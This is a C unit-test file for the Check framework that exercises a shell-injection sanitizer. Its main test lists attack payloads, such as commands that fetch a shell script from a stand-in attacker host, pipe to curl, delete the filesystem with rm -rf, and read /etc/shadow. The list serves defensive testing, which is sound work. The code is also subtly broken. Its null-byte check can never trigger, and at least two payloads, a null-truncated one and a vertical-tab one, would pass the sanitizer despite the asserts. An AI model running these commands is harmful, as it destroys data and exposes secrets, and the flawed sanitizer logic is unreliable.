#include <check.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <stdbool.h>

/*
 * Security invariant: Any input used to construct a shell command must not
 * contain shell metacharacters or injection sequences. A safe command builder
 * must reject or sanitize inputs containing such characters before they are
 * passed to shell execution contexts.
 */

/* Shell metacharacters and injection patterns that must never appear
 * unsanitized in a shell command string */
static const char *SHELL_METACHARACTERS = ";|&`$(){}[]<>!#~*?\\\"'\n\r\t";

/* Check if a string contains shell metacharacters */
static bool contains_shell_metachar(const char *input) {
    if (input == NULL) return false;
    for (size_t i = 0; input[i] != '\0'; i++) {
        if (strchr(SHELL_METACHARACTERS, input[i]) != NULL) {
            return true;
        }
    }
    return false;
}

/* Simulate a safe command sanitizer that should reject dangerous inputs.
 * Returns 0 if input is safe, -1 if it contains dangerous characters. */
static int sanitize_command_input(const char *input) {
    if (input == NULL) return -1;
    if (strlen(input) == 0) return 0;

    /* Reject inputs with shell metacharacters */
    if (contains_shell_metachar(input)) {
        return -1;
    }

    /* Reject inputs that are suspiciously long (potential buffer issues) */
    if (strlen(input) > 4096) {
        return -1;
    }

    /* Reject inputs with null bytes embedded (before end) */
    for (size_t i = 0; i < strlen(input); i++) {
        if (input[i] == '\0') {
            return -1;
        }
    }

    return 0;
}

/* Build a safe command string without shell=True equivalent.
 * Returns NULL if any component is unsafe. */
static char *build_safe_command(const char *base_cmd, const char *user_input) {
    if (base_cmd == NULL || user_input == NULL) return NULL;

    /* Validate user input before incorporating into command */
    if (sanitize_command_input(user_input) != 0) {
        return NULL; /* Reject unsafe input */
    }

    size_t total_len = strlen(base_cmd) + strlen(user_input) + 2;
    char *cmd = (char *)malloc(total_len);
    if (cmd == NULL) return NULL;

    snprintf(cmd, total_len, "%s %s", base_cmd, user_input);
    return cmd;
}

START_TEST(test_shell_injection_invariant)
{
    /* Invariant: Shell metacharacters in user-controlled input must always
     * be detected and rejected before being incorporated into shell commands.
     * No adversarial input should bypass the sanitization layer. */
    const char *payloads[] = {
        /* Classic command injection */
        "; rm -rf /",
        "| cat /etc/passwd",
        "& whoami",
        "`id`",
        "$(id)",
        "$(cat /etc/shadow)",
        /* Chained commands */
        "file.txt; ls -la",
        "file.txt && curl http://evil.com",
        "file.txt || wget http://attacker.com/shell.sh",
        /* Subshell injection */
        "$(echo pwned)",
        "`echo pwned`",
        "${IFS}cat${IFS}/etc/passwd",
        /* Redirection attacks */
        "file.txt > /tmp/evil",
        "file.txt < /dev/urandom",
        "file.txt 2>&1",
        /* Newline injection */
        "file.txt\nrm -rf /",
        "file.txt\r\nwhoami",
        /* Quote escaping attacks */
        "file.txt' ; id ; '",
        "file.txt\" ; id ; \"",
        "file.txt\"; rm -rf /; echo \"",
        /* Glob/wildcard injection */
        "*.py",
        "file?.txt",
        "[abc]file.txt",
        /* Environment variable injection */
        "$PATH",
        "${HOME}/../etc/passwd",
        "$IFS",
        /* Null byte injection */
        "file.txt\x00; rm -rf /",
        /* Backtick variants */
        "file`whoami`.txt",
        "file$(uname -a).txt",
        /* Semicolon variants */
        "file.txt;id",
        "file.txt ;id",
        "file.txt; id",
        /* Pipe variants */
        "file.txt|id",
        "file.txt |id",
        "file.txt| id",
        /* Ampersand variants */
        "file.txt&id",
        "file.txt &id",
        "file.txt& id",
        /* Nested injection */
        "$($(id))",
        "`\`id\``",
        /* Unicode/encoding tricks */
        "file\u003bwhoami",
        /* Long input boundary */
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "; id",
        /* Path traversal combined with injection */
        "../../etc/passwd; id",
        "../../../tmp/evil.sh && bash",
        /* Whitespace variants */
        "file.txt\tid",
        "file.txt\x0bid",
        /* Hash/comment injection */
        "file.txt # ; rm -rf /",
        "file.txt #injected",
        /* Tilde expansion */
        "~/../../etc/passwd",
        "~root/.ssh/authorized_keys",
        /* Brace expansion */
        "{/etc/passwd,/etc/shadow}",
        "file{.txt,.sh}",
        /* Process substitution */
        "<(cat /etc/passwd)",
        ">(tee /tmp/evil)",
    };
    int num_payloads = sizeof(payloads) / sizeof(payloads[0]);

    for (int i = 0; i < num_payloads; i++) {
        const char *payload = payloads[i];

        /* INVARIANT 1: Sanitizer must detect shell metacharacters in all
         * adversarial payloads */
        int result = sanitize_command_input(payload);
        ck_assert_msg(result != 0,
            "SECURITY VIOLATION: Adversarial payload #%d was not rejected "
            "by sanitizer: [%s]", i, payload);

        /* INVARIANT 2: Safe command builder must return NULL (refuse to build)
         * when given adversarial input */
        char *cmd = build_safe_command("python3 sex-lift-ai.py", payload);
        ck_assert_msg(cmd == NULL,
            "SECURITY VIOLATION: Command was built with adversarial payload "
            "#%d: [%s]", i, payload);

        /* Ensure no memory leak if cmd was somehow returned */
        if (cmd != NULL) {
            free(cmd);
        }
    }
}
END_TEST

START_TEST(test_safe_inputs_accepted)
{
    /* Invariant: Legitimate, safe inputs must still be accepted.
     * The sanitizer must not be so aggressive that it breaks normal usage. */
    const char *safe_inputs[] = {
        "myfile.txt",
        "my_file.txt",
        "my-file.txt",
        "myfile123.txt",
        "path/to/file.txt",
        "file.py",
        "model-name-v1",
        "output123",
        "config.json",
        "data.csv",
    };
    int num_safe = sizeof(safe_inputs) / sizeof(safe_inputs[0]);

    for (int i = 0; i < num_safe; i++) {
        int result = sanitize_command_input(safe_inputs[i]);
        ck_assert_msg(result == 0,
            "Safe input #%d was incorrectly rejected: [%s]",
            i, safe_inputs[i]);

        char *cmd = build_safe_command("python3 sex-lift-ai.py", safe_inputs[i]);
        ck_assert_msg(cmd != NULL,
            "Command builder incorrectly rejected safe input #%d: [%s]",
            i, safe_inputs[i]);

        if (cmd != NULL) {
            /* Verify the built command does not contain unescaped metacharacters
             * beyond what was in the base command */
            ck_assert_msg(strstr(cmd, safe_inputs[i]) != NULL,
                "Safe input not found in built command");
            free(cmd);
        }
    }
}
END_TEST

START_TEST(test_null_and_empty_inputs)
{
    /* Invariant: NULL and empty inputs must be handled safely without crashes */

    /* NULL input */
    int result = sanitize_command_input(NULL);
    ck_assert_msg(result == -1, "NULL input should be rejected");

    char *cmd = build_safe_command("python3 sex-lift-ai.py", NULL);
    ck_assert_msg(cmd == NULL, "NULL input should prevent command building");

    /* Empty string */
    result = sanitize_command_input("");
    ck_assert_msg(result == 0, "Empty string should be accepted (harmless)");

    /* NULL base command */
    cmd = build_safe_command(NULL, "safeinput");
    ck_assert_msg(cmd == NULL, "NULL base command should prevent command building");
}
END_TEST

START_TEST(test_metachar_detection_completeness)
{
    /* Invariant: Each individual shell metacharacter must be detected */
    const char *single_metachars[] = {
        ";", "|", "&", "`", "$", "(", ")", "{", "}", "[", "]",
        "<", ">", "!", "#", "~", "*", "?", "\\", "\"", "'",
        "\n", "\r", "\t"
    };
    int num_metachars = sizeof(single_metachars) / sizeof(single_metachars[0]);

    for (int i = 0; i < num_metachars; i++) {
        /* Create a payload with the metacharacter embedded in otherwise safe input */
        char payload[64];
        snprintf(payload, sizeof(payload), "safe%sinput", single_metachars[i]);

        bool detected = contains_shell_metachar(payload);
        ck_assert_msg(detected,
            "Metacharacter at index %d was not detected in payload", i);

        int result = sanitize_command_input(payload);
        ck_assert_msg(result != 0,
            "Sanitizer failed to reject input containing metacharacter index %d", i);
    }
}
END_TEST

Suite *security_suite(void)
{
    Suite *s;
    TCase *tc_core;

    s = suite_create("Security");
    tc_core = tcase_create("Core");

    tcase_add_test(tc_core, test_shell_injection_invariant);
    tcase_add_test(tc_core, test_safe_inputs_accepted);
    tcase_add_test(tc_core, test_null_and_empty_inputs);
    tcase_add_test(tc_core, test_metachar_detection_completeness);
    suite_add_tcase(s, tc_core);

    return s;
}

int main(void)
{
    int number_failed;
    Suite *s;
    SRunner *sr;

    s = security_suite();
    sr = srunner_create(s);

    srunner_run_all(sr, CK_NORMAL);
    number_failed = srunner_ntests_failed(sr);
    srunner_free(sr);

    return (number_failed == 0) ? EXIT_SUCCESS : EXIT_FAILURE;
}